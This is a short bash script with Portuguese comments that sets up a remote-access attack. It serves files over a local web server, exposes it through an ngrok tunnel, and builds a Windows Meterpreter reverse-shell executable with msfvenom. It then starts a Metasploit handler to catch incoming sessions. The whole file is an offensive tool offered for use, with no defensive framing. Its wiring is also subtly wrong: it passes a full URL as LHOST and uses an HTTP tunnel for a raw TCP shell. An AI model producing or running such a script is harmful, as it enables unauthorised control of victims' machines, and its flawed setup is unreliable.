#!/bin/bash

# Iniciar um servidor web local
python3 -m http.server 80 &

# Iniciar ngrok para redirecionar a porta 80
ngrok http 80 > /dev/null &

# Aguardar um momento para o ngrok gerar o URL público
sleep 5

# Extrair o URL público do ngrok
NGROK_URL=$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url)

# Criar payload usando msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$NGROK_URL LPORT=80 -f exe -o payload.exe

# Iniciar handler no Metasploit
echo "
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 80
exploit
" > handler.rc

msfconsole -r handler.rc
